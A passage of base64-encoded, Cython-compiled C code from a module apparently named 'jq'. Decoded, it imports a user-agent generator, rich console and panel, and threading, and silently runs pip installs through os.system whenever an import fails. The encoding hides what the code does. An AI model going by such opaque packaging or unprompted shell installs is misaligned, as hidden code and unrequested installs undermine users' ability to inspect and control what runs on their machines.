zQgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzksIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNiwgKDItX19weXhfdF82KSB8IChfX3B5eF90XzYqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwO1xuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF85KTsgX19weXhfdF85ID0gMDtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMzgsIF9fcHl4X0w0NF9leGNlcHRfZXJyb3IpXG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICAgICAgfVxuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICBnb3RvIF9fcHl4X0w0M19leGNlcHRpb25faGFuZGxlZDtcbiAgICB9XG5cbiAgICBcbiAgICBfX3B5eF9MNDRfZXhjZXB0X2Vycm9yOjtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzgpO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNyk7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xKTtcbiAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzgsIF9fcHl4X3RfNywgX19weXhfdF8xKTtcbiAgICBnb3RvIF9fcHl4X0wxX2Vycm9yO1xuICAgIF9fcHl4X0w0M19leGNlcHRpb25faGFuZGxlZDo7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF84KTtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzcpO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMSk7XG4gICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF84LCBfX3B5eF90XzcsIF9fcHl4X3RfMSk7XG4gICAgX19weXhfTDQ3X3RyeV9lbmQ6O1xuICB9XG5cbiAgXG4gIHtcbiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmVcbiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnblxuICAgIF9fUHl4X0V4Y2VwdGlvblNhdmUoJl9fcHl4X3RfMSwgJl9fcHl4X3RfNywgJl9fcHl4X3RfOCk7XG4gICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzEpO1xuICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF83KTtcbiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfOCk7XG4gICAgIHtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeUxpc3RfUGFjaygxLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2VuZXJhdGVfdXNlcl9hZ2VudCk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDQwLCBfX3B5eF9MNTBfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgICAgIF9fcHl4X3RfMiA9IF9fUHl4X0ltcG9ydChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdXNlcl9hZ2VudF8yLCBfX3B5eF90XzUsIDApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCA0MCwgX19weXhfTDUwX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X0ltcG9ydEZyb20oX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2VuZXJhdGVfdXNlcl9hZ2VudCk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDQwLCBfX3B5eF9MNTBfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2diLCBfX3B5eF90XzUpIDwgKDApKSBfX1BZWF9FUlIoMCwgNDAsIF9fcHl4X0w1MF9lcnJvcilcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG5cbiAgICAgIFxuICAgIH1cbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDtcbiAgICBnb3RvIF9fcHl4X0w1NV90cnlfZW5kO1xuICAgIF9fcHl4X0w1MF9lcnJvcjo7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF85KTsgX19weXhfdF85ID0gMDtcblxuICAgIFxuICAgICB7XG4gICAgICBfX1B5eF9BZGRUcmFjZWJhY2soImpxIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gICAgICBpZiAoX19QeXhfR2V0RXhjZXB0aW9uKCZfX3B5eF90XzIsICZfX3B5eF90XzUsICZfX3B5eF90XzMpIDwgMCkgX19QWVhfRVJSKDAsIDQxLCBfX3B5eF9MNTJfZXhjZXB0X2Vycm9yKVxuICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzIpO1xuICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzUpO1xuICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzMpO1xuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfOSA9IE5VTEw7XG4gICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMTAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9vcyk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMCkpIF9fUFlYX0VSUigwLCA0MiwgX19weXhfTDUyX2V4Y2VwdF9lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTtcbiAgICAgIF9fcHl4X3RfMTEgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfMTAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zeXN0ZW0pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTEpKSBfX1BZWF9FUlIoMCwgNDIsIF9fcHl4X0w1Ml9leGNlcHRfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMSk7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwO1xuICAgICAgX19weXhfdF82ID0gMTtcbiAgICAgIHtcbiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfOSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9waXBfaW5zdGFsbF9qc29ufTtcbiAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF8xMSwgX19weXhfY2FsbGFyZ3MrX19weXhfdF82LCAoMi1fX3B5eF90XzYpIHwgKF9fcHl4X3RfNipfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzkpOyBfX3B5eF90XzkgPSAwO1xuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwO1xuICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA0MiwgX19weXhfTDUyX2V4Y2VwdF9lcnJvcilcbiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gICAgICB9XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcbiAgICAgIGdvdG8gX19weXhfTDUxX2V4Y2VwdGlvbl9oYW5kbGVkO1xuICAgIH1cblxuICAgIFxuICAgIF9fcHl4X0w1Ml9leGNlcHRfZXJyb3I6O1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMSk7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF83KTtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzgpO1xuICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfMSwgX19weXhfdF83LCBfX3B5eF90XzgpO1xuICAgIGdvdG8gX19weXhfTDFfZXJyb3I7XG4gICAgX19weXhfTDUxX2V4Y2VwdGlvbl9oYW5kbGVkOjtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEpO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNyk7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF84KTtcbiAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzEsIF9fcHl4X3RfNywgX19weXhfdF84KTtcbiAgICBfX3B5eF9MNTVfdHJ5X2VuZDo7XG4gIH1cblxuICBcbiAge1xuICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZVxuICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfYXNzaWduXG4gICAgX19QeXhfRXhjZXB0aW9uU2F2ZSgmX19weXhfdF84LCAmX19weXhfdF83LCAmX19weXhfdF8xKTtcbiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfOCk7XG4gICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzcpO1xuICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xKTtcbiAgICAge1xuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfMyA9IF9fUHl4X1B5TGlzdF9QYWNrKDEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9Db25zb2xlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgNDQsIF9fcHl4X0w1OF9lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpO1xuICAgICAgX19weXhfdF81ID0gX19QeXhfSW1wb3J0KF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yaWNoX2NvbnNvbGUsIF9fcHl4X3RfMywgMCk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDQ0LCBfX3B5eF9MNThfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuICAgICAgX19weXhfdF8zID0gX19QeXhfSW1wb3J0RnJvbShfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9Db25zb2xlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgNDQsIF9fcHl4X0w1OF9lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpO1xuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9Db25zb2xlLCBfX3B5eF90XzMpIDwgKDApKSBfX1BZWF9FUlIoMCwgNDQsIF9fcHl4X0w1OF9lcnJvcilcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG5cbiAgICAgIFxuICAgIH1cbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcbiAgICBnb3RvIF9fcHl4X0w2M190cnlfZW5kO1xuICAgIF9fcHl4X0w1OF9lcnJvcjo7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF85KTsgX19weXhfdF85ID0gMDtcblxuICAgIFxuICAgICB7XG4gICAgICBfX1B5eF9BZGRUcmFjZWJhY2soImpxIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gICAgICBpZiAoX19QeXhfR2V0RXhjZXB0aW9uKCZfX3B5eF90XzUsICZfX3B5eF90XzMsICZfX3B5eF90XzIpIDwgMCkgX19QWVhfRVJSKDAsIDQ1LCBfX3B5eF9MNjBfZXhjZXB0X2Vycm9yKVxuICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzUpO1xuICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzMpO1xuICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzIpO1xuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfMTEgPSBOVUxMO1xuICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzksIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9vcyk7IGlmICh1bmxpa2VseSghX19weXhfdF85KSkgX19QWVhfRVJSKDAsIDQ2LCBfX3B5eF9MNjBfZXhjZXB0X2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOSk7XG4gICAgICBfX3B5eF90XzEwID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzksIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zeXN0ZW0pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTApKSBfX1BZWF9FUlIoMCwgNDYsIF9fcHl4X0w2MF9leGNlcHRfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMCk7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF85KTsgX19weXhfdF85ID0gMDtcbiAgICAgIF9fcHl4X3RfNiA9IDE7XG4gICAgICB7XG4gICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzExLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X3BpcF9pbnN0YWxsX3JpY2h9O1xuICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzEwLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzYsICgyLV9fcHl4X3RfNikgfCAoX19weXhfdF82Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgNDYsIF9fcHl4X0w2MF9leGNlcHRfZXJyb3IpXG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICAgICAgfVxuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gICAgICBnb3RvIF9fcHl4X0w1OV9leGNlcHRpb25faGFuZGxlZDtcbiAgICB9XG5cbiAgICBcbiAgICBfX3B5eF9MNjBfZXhjZXB0X2Vycm9yOjtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzgpO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNyk7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xKTtcbiAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzgsIF9fcHl4X3RfNywgX19weXhfdF8xKTtcbiAgICBnb3RvIF9fcHl4X0wxX2Vycm9yO1xuICAgIF9fcHl4X0w1OV9leGNlcHRpb25faGFuZGxlZDo7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF84KTtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzcpO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMSk7XG4gICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF84LCBfX3B5eF90XzcsIF9fcHl4X3RfMSk7XG4gICAgX19weXhfTDYzX3RyeV9lbmQ6O1xuICB9XG5cbiAgXG4gIHtcbiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmVcbiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnblxuICAgIF9fUHl4X0V4Y2VwdGlvblNhdmUoJl9fcHl4X3RfMSwgJl9fcHl4X3RfNywgJl9fcHl4X3RfOCk7XG4gICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzEpO1xuICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF83KTtcbiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfOCk7XG4gICAgIHtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzIgPSBfX1B5eF9QeUxpc3RfUGFjaygxLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfUGFuZWwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCA0OCwgX19weXhfTDY2X2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7XG4gICAgICBfX3B5eF90XzMgPSBfX1B5eF9JbXBvcnQoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JpY2hfcGFuZWwsIF9fcHl4X3RfMiwgMCk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDQ4LCBfX3B5eF9MNjZfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgICAgX19weXhfdF8yID0gX19QeXhfSW1wb3J0RnJvbShfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9QYW5lbCk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDQ4LCBfX3B5eF9MNjZfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTtcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfUGFuZWwsIF9fcHl4X3RfMikgPCAoMCkpIF9fUFlYX0VSUigwLCA0OCwgX19weXhfTDY2X2Vycm9yKVxuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcblxuICAgICAgXG4gICAgfVxuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwO1xuICAgIGdvdG8gX19weXhfTDcxX3RyeV9lbmQ7XG4gICAgX19weXhfTDY2X2Vycm9yOjtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzkpOyBfX3B5eF90XzkgPSAwO1xuXG4gICAgXG4gICAgIHtcbiAgICAgIF9fUHl4X0FkZFRyYWNlYmFjaygianEiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTtcbiAgICAgIGlmIChfX1B5eF9HZXRFeGNlcHRpb24oJl9fcHl4X3RfMywgJl9fcHl4X3RfMiwgJl9fcHl4X3RfNSkgPCAwKSBfX1BZWF9FUlIoMCwgNDksIF9fcHl4X0w2OF9leGNlcHRfZXJyb3IpXG4gICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMyk7XG4gICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMik7XG4gICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNSk7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF8xMCA9IE5VTEw7XG4gICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMTEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9vcyk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMSkpIF9fUFlYX0VSUigwLCA1MCwgX19weXhfTDY4X2V4Y2VwdF9lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzExKTtcbiAgICAgIF9fcHl4X3RfOSA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF8xMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3N5c3RlbSk7IGlmICh1bmxpa2VseSghX19weXhfdF85KSkgX19QWVhfRVJSKDAsIDUwLCBfX3B5eF9MNjhfZXhjZXB0X2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOSk7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwO1xuICAgICAgX19weXhfdF82ID0gMTtcbiAgICAgIHtcbiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMTAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfcGlwX2luc3RhbGxfdGhyZWFkaW5nfTtcbiAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF85LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzYsICgyLV9fcHl4X3RfNikgfCAoX19weXhfdF82Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOSk7IF9fcHl4X3RfOSA9IDA7XG4gICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDUwLCBfX3B5eF9MNjhfZXhjZXB0X2Vycm9yKVxuICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgICAgIH1cbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgICAgZ290byBfX3B5eF9MNjdfZXhjZXB0aW9uX2hhbmRsZWQ7XG4gICAgfVxuXG4gICAgXG4gICAgX19weXhfTDY4X2V4Y2VwdF9lcnJvcjo7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xKTtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzcpO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfOCk7XG4gICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF8xLCBfX3B5eF90XzcsIF9fcHl4X3RfOCk7XG4gICAgZ290byBfX3B5eF9MMV9lcnJvcjtcbiAgICBfX3B5eF9MNjdfZXhjZXB0aW9uX2hhbmRsZWQ6O1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMSk7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF83KTtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzgpO1xuICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfMSwgX19weXhfdF83LCBfX3B5eF90XzgpO1xuICAgIF9fcHl4X0w3MV90cnlfZW5kOjtcbiAgfVxuXG4gIFxuICB7XG4gICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlXG4gICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ25cbiAgICBfX1B5eF9FeGNlcHRpb25TYXZlKCZfX3B5eF90XzgsICZfX3B5eF90XzcsICZfX3B5eF90XzEpO1xuICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF84KTtcbiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNyk7XG4gICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzEpO1xuICAgICB7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF81ID0gX19QeXhfSW1wb3J0RG90dGVkTW9kdWxlKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90aHJlYWRpbmcsIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA1Mi